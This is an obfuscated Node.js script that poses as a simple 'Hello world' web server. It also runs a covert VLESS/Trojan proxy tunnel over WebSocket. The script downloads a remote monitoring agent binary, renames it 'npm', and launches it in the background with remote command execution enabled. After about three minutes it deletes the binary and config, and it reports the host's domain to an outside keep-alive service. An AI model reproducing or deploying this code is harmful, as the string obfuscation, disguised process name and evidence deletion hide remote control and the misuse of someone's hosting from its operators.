const _0x578e86=_0x53fc;(function(_0x43582e,_0x1d2565){const _0xf3d950=_0x53fc,_0x135ec4=_0x43582e();while(!![]){try{const _0x2300fb=parseInt(_0xf3d950(0x1c2))/0x1*(parseInt(_0xf3d950(0x189))/0x2)+parseInt(_0xf3d950(0x19c))/0x3*(-parseInt(_0xf3d950(0x1ac))/0x4)+parseInt(_0xf3d950(0x18f))/0x5+-parseInt(_0xf3d950(0x1d5))/0x6+-parseInt(_0xf3d950(0x1a2))/0x7*(parseInt(_0xf3d950(0x1eb))/0x8)+-parseInt(_0xf3d950(0x1af))/0x9*(parseInt(_0xf3d950(0x184))/0xa)+-parseInt(_0xf3d950(0x1c0))/0xb*(-parseInt(_0xf3d950(0x1e9))/0xc);if(_0x2300fb===_0x1d2565)break;else _0x135ec4['push'](_0x135ec4['shift']());}catch(_0x591bd0){_0x135ec4['push'](_0x135ec4['shift']());}}}(_0x5022,0xce34b));const os=require('os'),http=require(_0x578e86(0x1ed)),fs=require('fs'),axios=require(_0x578e86(0x1cf)),net=require(_0x578e86(0x1cc)),path=require(_0x578e86(0x18b)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x578e86(0x198)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x578e86(0x1a7)][_0x578e86(0x18d)]||_0x578e86(0x1aa),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x578e86(0x1a7)][_0x578e86(0x19a)]||'',NEZHA_KEY=process['env'][_0x578e86(0x190)]||'',DOMAIN=process[_0x578e86(0x1a7)][_0x578e86(0x175)]||_0x578e86(0x17f),AUTO_ACCESS=process[_0x578e86(0x1a7)][_0x578e86(0x1c9)]||!![],WSPATH=process[_0x578e86(0x1a7)]['WSPATH']||UUID[_0x578e86(0x1ad)](0x0,0x8),SUB_PATH=process[_0x578e86(0x1a7)]['SUB_PATH']||_0x578e86(0x1c6),NAME=process[_0x578e86(0x1a7)][_0x578e86(0x1a1)]||_0x578e86(0x188),PORT=process[_0x578e86(0x1a7)][_0x578e86(0x191)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x567bc5=_0x578e86;try{const _0x42ccf8=await axios[_0x567bc5(0x1be)](_0x567bc5(0x17c)),_0x11fc4b=_0x42ccf8[_0x567bc5(0x1d0)];ISP=(_0x11fc4b[_0x567bc5(0x1e1)]+'-'+_0x11fc4b[_0x567bc5(0x1e6)])['replace'](/ /g,'_');}catch(_0x3d41d5){ISP=_0x567bc5(0x199);}};GetISP();const httpServer=http['createServer']((_0x2d5017,_0x5b4623)=>{const _0x45b434=_0x578e86;if(_0x2d5017[_0x45b434(0x1c5)]==='/'){const _0x5c3856=path['join'](__dirname,_0x45b434(0x1cb));fs['readFile'](_0x5c3856,_0x45b434(0x18e),(_0x531a21,_0x375a65)=>{const _0x57faa6=_0x45b434;if(_0x531a21){_0x5b4623[_0x57faa6(0x1b2)](0xc8,{'Content-Type':_0x57faa6(0x187)}),_0x5b4623[_0x57faa6(0x1c1)](_0x57faa6(0x1ec));return;}_0x5b4623[_0x57faa6(0x1b2)](0xc8,{'Content-Type':_0x57faa6(0x187)}),_0x5b4623['end'](_0x375a65);});return;}else{if(_0x2d5017['url']==='/'+SUB_PATH){const _0x41eacd=_0x45b434(0x1bb)+UUID+'@'+DOMAIN+_0x45b434(0x1df)+DOMAIN+_0x45b434(0x1da)+DOMAIN+_0x45b434(0x1c3)+WSPATH+'#'+NAME+'-'+ISP,_0x102681=_0x45b434(0x1a3)+UUID+'@'+DOMAIN+_0x45b434(0x182)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1c038a=_0x41eacd+'\x0a'+_0x102681,_0x2a1d6f=Buffer[_0x45b434(0x18a)](_0x1c038a)[_0x45b434(0x1ce)](_0x45b434(0x1b3));_0x5b4623[_0x45b434(0x1b2)](0xc8,{'Content-Type':_0x45b434(0x195)}),_0x5b4623['end'](_0x2a1d6f+'\x0a');}else _0x5b4623[_0x45b434(0x1b2)](0x194,{'Content-Type':_0x45b434(0x195)}),_0x5b4623[_0x45b434(0x1c1)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x578e86(0x194)](/-/g,''),DNS_SERVERS=[_0x578e86(0x1ea),'1.1.1.1'];function _0x53fc(_0x30ec45,_0x8465e6){_0x30ec45=_0x30ec45-0x172;const _0x502281=_0x5022();let _0x53fc0b=_0x502281[_0x30ec45];return _0x53fc0b;}function _0x5022(){const _0x35157b=['http','message','trim','https://','npm','config.yaml','DOMAIN','--tls','https://arm64.ssss.nyc.mn/v1','reduce','Answer','\x20-p\x20','length','https://speed.cloudflare.com/meta','unlink','pipe','1234.abc.com','test','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',':443?security=tls&sni=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','6232150IPHpbS','stream','\x20with\x20all\x20DNS\x20servers','text/html','Hug','1024zgQefV','from','path','arch','UUID','utf8','1918755ehgbhT','NEZHA_KEY','PORT','then','close','replace','text/plain','sha224','createWriteStream','child_process','Unknown','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-s\x20','2031NDLoGB','application/dns-json','&type=A','npm\x20download\x20successfully','https://dns.google/resolve?name=','NAME','1484xpKZjl','trojan://','connection','aarch64','2096','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','d42120f0-7b97-41d7-b680-545365b1eee2','error','7164LqABHt','slice','utf-8','9NqBzOj','substr','2083','writeHead','base64','Failed\x20to\x20resolve\x20','catch','post','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','connect','arm64','/bin/bash','vless://','pop','join','get','client_secret:\x20','22011649VyLOvh','end','3217cPrxxK','&path=%2F','443','url','1209','log','split','AUTO_ACCESS','readUInt16BE','index.html','net','listen','toString','axios','data','includes','every','concat','hex','7844862KvNMal','https://arm64.ssss.nyc.mn/agent','npm\x20is\x20running','write','Automatic\x20Access\x20Task\x20added\x20successfully','&fp=chrome&type=ws&host=','digest','chmod\x20+x\x20npm','8443','npm\x20running\x20error:',':443?encryption=none&security=tls&sni=','map','country','finish','Server\x20is\x20running\x20on\x20port\x20','https://amd64.ssss.nyc.mn/agent','readUInt8','asOrganization','npm\x20is\x20already\x20running,\x20skip\x20running...','https://oooo.serv00.net/add-url','12JefJla','8.8.4.4','1664IXZYBO','Hello\x20world!'];_0x5022=function(){return _0x35157b;};return _0x5022();}function resolveHost(_0x30e228){return new Promise((_0x5a40ee,_0x39d6b8)=>{const _0x3b2cc2=_0x53fc;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3b2cc2(0x180)](_0x30e228)){_0x5a40ee(_0x30e228);return;}let _0x13fe52=0x0;function _0x20e6d0(){const _0x1173a5=_0x3b2cc2;if(_0x13fe52>=DNS_SERVERS[_0x1173a5(0x17b)]){_0x39d6b8(new Error(_0x1173a5(0x1b4)+_0x30e228+_0x1173a5(0x186)));return;}const _0x3247e5=DNS_SERVERS[_0x13fe52];_0x13fe52++;const _0x1145db=_0x1173a5(0x1a0)+encodeURIComponent(_0x30e228)+_0x1173a5(0x19e);axios[_0x1173a5(0x1be)](_0x1145db,{'timeout':0x1388,'headers':{'Accept':_0x1173a5(0x19d)}})[_0x1173a5(0x192)](_0x235ffa=>{const _0xf705ba=_0x1173a5,_0x2a37ce=_0x235ffa[_0xf705ba(0x1d0)];if(_0x2a37ce['Status']===0x0&&_0x2a37ce[_0xf705ba(0x179)]&&_0x2a37ce['Answer'][_0xf705ba(0x17b)]>0x0){const _0x8903b5=_0x2a37ce[_0xf705ba(0x179)]['find'](_0x43af4f=>_0x43af4f['type']===0x1);if(_0x8903b5){_0x5a40ee(_0x8903b5[_0xf705ba(0x1d0)]);return;}}_0x20e6d0();})[_0x1173a5(0x1b5)](_0x59cba3=>{_0x20e6d0();});}_0x20e6d0();});}function handleVlessConnection(_0x15a200,_0x2f47c1){const _0x24ed58=_0x578e86,[_0x64f3d4]=_0x2f47c1,_0x138d0f=_0x2f47c1[_0x24ed58(0x1ad)](0x1,0x11);if(!_0x138d0f[_0x24ed58(0x1d2)]((_0xc03d45,_0x1ea2e4)=>_0xc03d45==parseInt(uuid[_0x24ed58(0x1b0)](_0x1ea2e4*0x2,0x2),0x10)))return![];let _0x5f125a=_0x2f47c1[_0x24ed58(0x1ad)](0x11,0x12)['readUInt8']()+0x13;const _0x5bdf4b=_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a,_0x5f125a+=0x2)[_0x24ed58(0x1ca)](0x0),_0x1bf711=_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a,_0x5f125a+=0x1)[_0x24ed58(0x1e5)](),_0xf876a2=_0x1bf711==0x1?_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a,_0x5f125a+=0x4)['join']('.'):_0x1bf711==0x2?new TextDecoder()['decode'](_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a+0x1,_0x5f125a+=0x1+_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a,_0x5f125a+0x1)[_0x24ed58(0x1e5)]())):_0x1bf711==0x3?_0x2f47c1[_0x24ed58(0x1ad)](_0x5f125a,_0x5f125a+=0x10)['reduce']((_0x1c66ea,_0x1a2746,_0x3cce82,_0x49a39f)=>_0x3cce82%0x2?_0x1c66ea[_0x24ed58(0x1d3)](_0x49a39f[_0x24ed58(0x1ad)](_0x3cce82-0x1,_0x3cce82+0x1)):_0x1c66ea,[])[_0x24ed58(0x1e0)](_0x5282d1=>_0x5282d1[_0x24ed58(0x1ca)](0x0)[_0x24ed58(0x1ce)](0x10))['join'](':'):'';_0x15a200['send'](new Uint8Array([_0x64f3d4,0x0]));const _0x2cc85c=createWebSocketStream(_0x15a200);return resolveHost(_0xf876a2)[_0x24ed58(0x192)](_0x32d1a6=>{const _0x2f3c1=_0x24ed58;net[_0x2f3c1(0x1b8)]({'host':_0x32d1a6,'port':_0x5bdf4b},function(){const _0x2087a=_0x2f3c1;this[_0x2087a(0x1d8)](_0x2f47c1[_0x2087a(0x1ad)](_0x5f125a)),_0x2cc85c['on'](_0x2087a(0x1ab),()=>{})['pipe'](this)['on']('error',()=>{})[_0x2087a(0x17e)](_0x2cc85c);})['on'](_0x2f3c1(0x1ab),()=>{});})[_0x24ed58(0x1b5)](_0xb06e6f=>{const _0x31a209=_0x24ed58;net[_0x31a209(0x1b8)]({'host':_0xf876a2,'port':_0x5bdf4b},function(){const _0x58ab41=_0x31a209;this[_0x58ab41(0x1d8)](_0x2f47c1[_0x58ab41(0x1ad)](_0x5f125a)),_0x2cc85c['on']('error',()=>{})[_0x58ab41(0x17e)](this)['on'](_0x58ab41(0x1ab),()=>{})[_0x58ab41(0x17e)](_0x2cc85c);})['on'](_0x31a209(0x1ab),()=>{});}),!![];}function handleTrojanConnection(_0xb9fa4,_0x3bf111){const _0xfdb027=_0x578e86;try{if(_0x3bf111[_0xfdb027(0x17b)]<0x3a)return![];const _0xd806f6=_0x3bf111[_0xfdb027(0x1ad)](0x0,0x38)[_0xfdb027(0x1ce)](),_0x4bbbc7=[UUID];let _0x34be8f=null;for(const _0x4e3e90 of _0x4bbbc7){const _0x258fac=crypto['createHash'](_0xfdb027(0x196))['update'](_0x4e3e90)[_0xfdb027(0x1db)](_0xfdb027(0x1d4));if(_0x258fac===_0xd806f6){_0x34be8f=_0x4e3e90;break;}}if(!_0x34be8f)return![];let _0x3f001a=0x38;_0x3bf111[_0x3f001a]===0xd&&_0x3bf111[_0x3f001a+0x1]===0xa&&(_0x3f001a+=0x2);const _0x7245e6=_0x3bf111[_0x3f001a];if(_0x7245e6!==0x1)return![];_0x3f001a+=0x1;const _0x29fe0f=_0x3bf111[_0x3f001a];_0x3f001a+=0x1;let _0x4b6e8c,_0x3b364f;if(_0x29fe0f===0x1)_0x4b6e8c=_0x3bf111['slice'](_0x3f001a,_0x3f001a+0x4)[_0xfdb027(0x1bd)]('.'),_0x3f001a+=0x4;else{if(_0x29fe0f===0x3){const _0x107cf7=_0x3bf111[_0x3f001a];_0x3f001a+=0x1,_0x4b6e8c=_0x3bf111[_0xfdb027(0x1ad)](_0x3f001a,_0x3f001a+_0x107cf7)['toString'](),_0x3f001a+=_0x107cf7;}else{if(_0x29fe0f===0x4)_0x4b6e8c=_0x3bf111[_0xfdb027(0x1ad)](_0x3f001a,_0x3f001a+0x10)[_0xfdb027(0x178)]((_0x3773fe,_0x2c2340,_0x4da944,_0x4fa5af)=>_0x4da944%0x2?_0x3773fe[_0xfdb027(0x1d3)](_0x4fa5af['slice'](_0x4da944-0x1,_0x4da944+0x1)):_0x3773fe,[])[_0xfdb027(0x1e0)](_0x353eac=>_0x353eac['readUInt16BE'](0x0)[_0xfdb027(0x1ce)](0x10))[_0xfdb027(0x1bd)](':'),_0x3f001a+=0x10;else return![];}}_0x3b364f=_0x3bf111['readUInt16BE'](_0x3f001a),_0x3f001a+=0x2;_0x3f001a<_0x3bf111[_0xfdb027(0x17b)]&&_0x3bf111[_0x3f001a]===0xd&&_0x3bf111[_0x3f001a+0x1]===0xa&&(_0x3f001a+=0x2);const _0x59d087=createWebSocketStream(_0xb9fa4);return resolveHost(_0x4b6e8c)['then'](_0x792dad=>{const _0x338b0e=_0xfdb027;net[_0x338b0e(0x1b8)]({'host':_0x792dad,'port':_0x3b364f},function(){const _0x48d08e=_0x338b0e;_0x3f001a<_0x3bf111[_0x48d08e(0x17b)]&&this['write'](_0x3bf111[_0x48d08e(0x1ad)](_0x3f001a)),_0x59d087['on']('error',()=>{})[_0x48d08e(0x17e)](this)['on']('error',()=>{})[_0x48d08e(0x17e)](_0x59d087);})['on']('error',()=>{});})[_0xfdb027(0x1b5)](_0x4a7083=>{net['connect']({'host':_0x4b6e8c,'port':_0x3b364f},function(){const _0xdd9ae=_0x53fc;_0x3f001a<_0x3bf111[_0xdd9ae(0x17b)]&&this['write'](_0x3bf111[_0xdd9ae(0x1ad)](_0x3f001a)),_0x59d087['on'](_0xdd9ae(0x1ab),()=>{})[_0xdd9ae(0x17e)](this)['on'](_0xdd9ae(0x1ab),()=>{})['pipe'](_0x59d087);})['on']('error',()=>{});}),!![];}catch(_0xdd5ba5){return![];}}wss['on'](_0x578e86(0x1a4),(_0x555ced,_0x45d5fb)=>{const _0x4959b8=_0x578e86,_0x18e24d=_0x45d5fb[_0x4959b8(0x1c5)]||'';_0x555ced['once'](_0x4959b8(0x1ee),_0x5e0e8a=>{const _0x26cea6=_0x4959b8;if(_0x5e0e8a[_0x26cea6(0x17b)]>0x11&&_0x5e0e8a[0x0]===0x0){const _0x3e41e4=_0x5e0e8a[_0x26cea6(0x1ad)](0x1,0x11),_0xe8e8c6=_0x3e41e4[_0x26cea6(0x1d2)]((_0x15bf0f,_0x4ca91f)=>_0x15bf0f==parseInt(uuid[_0x26cea6(0x1b0)](_0x4ca91f*0x2,0x2),0x10));if(_0xe8e8c6){!handleVlessConnection(_0x555ced,_0x5e0e8a)&&_0x555ced[_0x26cea6(0x193)]();return;}}!handleTrojanConnection(_0x555ced,_0x5e0e8a)&&_0x555ced[_0x26cea6(0x193)]();})['on'](_0x4959b8(0x1ab),()=>{});});const getDownloadUrl=()=>{const _0x41c1f8=_0x578e86,_0x4254fa=os[_0x41c1f8(0x18c)]();return _0x4254fa==='arm'||_0x4254fa===_0x41c1f8(0x1b9)||_0x4254fa===_0x41c1f8(0x1a5)?!NEZHA_PORT?_0x41c1f8(0x177):_0x41c1f8(0x1d6):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x41c1f8(0x1e4);},downloadFile=async()=>{const _0x521dd2=_0x578e86;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xa7b15b=getDownloadUrl(),_0x101f37=await axios({'method':_0x521dd2(0x1be),'url':_0xa7b15b,'responseType':_0x521dd2(0x185)}),_0x5041fc=fs[_0x521dd2(0x197)]('npm');return _0x101f37[_0x521dd2(0x1d0)][_0x521dd2(0x17e)](_0x5041fc),new Promise((_0x55c508,_0x27027d)=>{const _0x445a4a=_0x521dd2;_0x5041fc['on'](_0x445a4a(0x1e2),()=>{const _0x420332=_0x445a4a;console[_0x420332(0x1c7)](_0x420332(0x19f)),exec(_0x420332(0x1dc),_0x215a34=>{if(_0x215a34)_0x27027d(_0x215a34);_0x55c508();});}),_0x5041fc['on'](_0x445a4a(0x1ab),_0x27027d);});}catch(_0x1924b8){throw _0x1924b8;}},runnz=async()=>{const _0x2ed6fb=_0x578e86;try{const _0x48a267=execSync(_0x2ed6fb(0x183),{'encoding':_0x2ed6fb(0x1ae)});if(_0x48a267[_0x2ed6fb(0x1ef)]()!==''){console[_0x2ed6fb(0x1c7)](_0x2ed6fb(0x1e7));return;}}catch(_0x27a2ef){}await downloadFile();let _0x1a2576='',_0x1d4129=[_0x2ed6fb(0x1c4),_0x2ed6fb(0x1dd),_0x2ed6fb(0x1a6),'2087',_0x2ed6fb(0x1b1),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x27d071=_0x1d4129[_0x2ed6fb(0x1d1)](NEZHA_PORT)?_0x2ed6fb(0x176):'';_0x1a2576=_0x2ed6fb(0x19b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2ed6fb(0x17a)+NEZHA_KEY+'\x20'+_0x27d071+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x402c94=NEZHA_SERVER[_0x2ed6fb(0x1d1)](':')?NEZHA_SERVER[_0x2ed6fb(0x1c8)](':')[_0x2ed6fb(0x1bc)]():'',_0x3c0409=_0x1d4129[_0x2ed6fb(0x1d1)](_0x402c94)?'true':'false',_0x464847=_0x2ed6fb(0x1bf)+NEZHA_KEY+_0x2ed6fb(0x181)+NEZHA_SERVER+_0x2ed6fb(0x1b7)+_0x3c0409+_0x2ed6fb(0x1a8)+UUID;fs['writeFileSync'](_0x2ed6fb(0x174),_0x464847);}_0x1a2576=_0x2ed6fb(0x1a9);}else{console[_0x2ed6fb(0x1c7)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1a2576,{'shell':_0x2ed6fb(0x1ba)},_0x54943f=>{const _0x52d165=_0x2ed6fb;if(_0x54943f)console[_0x52d165(0x1ab)](_0x52d165(0x1de),_0x54943f);else console['log'](_0x52d165(0x1d7));});}catch(_0x3c27a8){console['error']('error:\x20'+_0x3c27a8);}};async function addAccessTask(){const _0x1ce106=_0x578e86;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2e974f=_0x1ce106(0x172)+DOMAIN;try{const _0x1c8f30=await axios[_0x1ce106(0x1b6)](_0x1ce106(0x1e8),{'url':_0x2e974f},{'headers':{'Content-Type':'application/json'}});console[_0x1ce106(0x1c7)](_0x1ce106(0x1d9));}catch(_0x39a12f){}}const delFiles=()=>{const _0x4815dc=_0x578e86;fs[_0x4815dc(0x17d)](_0x4815dc(0x173),()=>{}),fs['unlink'](_0x4815dc(0x174),()=>{});};httpServer[_0x578e86(0x1cd)](PORT,()=>{const _0x5eb038=_0x578e86;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5eb038(0x1c7)](_0x5eb038(0x1e3)+PORT);});
